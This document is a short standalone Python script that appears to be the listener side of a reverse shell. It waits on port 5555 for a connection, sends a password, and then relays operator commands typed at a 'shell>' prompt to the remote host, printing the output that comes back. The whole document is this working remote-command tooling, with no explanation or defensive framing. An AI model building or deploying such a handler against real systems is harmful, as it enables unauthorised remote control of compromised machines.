#!/usr/bin/env python3

import socket
import struct
import argparse
import sys
import getpass


def recvall(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', default='0.0.0.0')
    parser.add_argument('--port', type=int, default=5555)
    args = parser.parse_args()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((args.host, args.port))
    s.listen(1)
    print(f"[*] Listening on {args.host}:{args.port}")
    conn, addr = s.accept()
    print(f"[+] Connection from {addr}")

    password = getpass.getpass("Password: ")
    conn.send(struct.pack("!I", len(password)) + password.encode())

    try:
        while True:
            cmd = input("shell> ")
            if not cmd:
                continue
            data = cmd.encode()
            conn.send(struct.pack('!I', len(data)) + data)
            raw = recvall(conn, 4)
            if not raw:
                print("[-] Disconnected.")
                break
            out_len = struct.unpack('!I', raw)[0]
            resp = recvall(conn, out_len)
            if resp is None:
                print("[-] Disconnected.")
                break
            print(resp.decode(), end='')
    except KeyboardInterrupt:
        print("\n[!] Exit.")
    finally:
        conn.close()
        s.close()


if __name__ == '__main__':
    main()
